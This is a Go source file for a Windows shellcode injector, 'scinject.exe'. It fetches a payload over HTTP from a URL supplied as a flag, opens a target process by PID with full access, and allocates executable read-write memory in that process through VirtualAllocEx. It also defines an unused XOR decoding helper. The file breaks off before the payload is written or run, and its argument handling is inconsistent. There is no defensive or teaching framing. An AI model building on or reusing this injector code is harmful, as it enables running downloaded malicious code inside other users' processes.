package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"

	"golang.org/x/sys/windows"
)

func xor(b, k []byte) ([]byte, error) {
	if len(k) == 0 {
		return nil, fmt.Errorf("Key too short")
	}

	xb := make([]byte, 0, len(b))
	for i := 0; i < len(b); i++ {
		xb = append(xb, b[i]^k[i%len(k)])
	}

	return xb, nil
}

func fetchPayload(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func main() {

	// key := byte(333)

	if len(os.Args) < 2 {
		fmt.Println("Error: Missing PID Arg. Usage: scinject.exe <PID>")
		os.Exit(1)
	}

	/* Path to shellcode */
	// create flag "-f" its should take a filepath to shellcode

	var scFilePath string
	flag.StringVar(&scFilePath, "f", "", "Path to shellcode")

	flag.Parse()

	sc, err := fetchPayload(scFilePath)
	if err != nil {
		fmt.Printf("Error: fileread failure: %v\n", err)
		os.Exit(1)
	}

	// Errh: validate flag input

	// if _, ok := scFilePath.(string); !ok {
	// flag.Usage()
	// os.Exit(1)
	// }

	pid, err := strconv.ParseUint((os.Args[1]), 10, 32)
	if err != nil {
		fmt.Printf("Error parsing PID %v\n", err)
		os.Exit(1)
	}
	pid32 := uint32(pid)

	/* Open Process */
	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid32)
	if err != nil {
		fmt.Printf("Error opening process {%d}: %v\n", pid32, err)
		os.Exit(1)
	}
	defer windows.CloseHandle(hProcess)

	fmt.Printf("Handle recieved on process {%d}: %v\n", pid32, hProcess)

	kernel32dll := windows.NewLazyDLL("kernel32.dll")
	pVirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")

	/*
		LPVOID VirtualAllocEx(
			  [in]           HANDLE hProcess,
			    [in, optional] LPVOID lpAddress,
			      [in]           SIZE_T dwSize,
			        [in]           DWORD  flAllocationType,
			          [in]           DWORD  flProtect
			          );
		)
	*/

	r1, _, err := pVirtualAllocEx.Call(uintptr(hProcess),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE))
	if r1 == 0 {
		fmt.Println(err)
	}

}
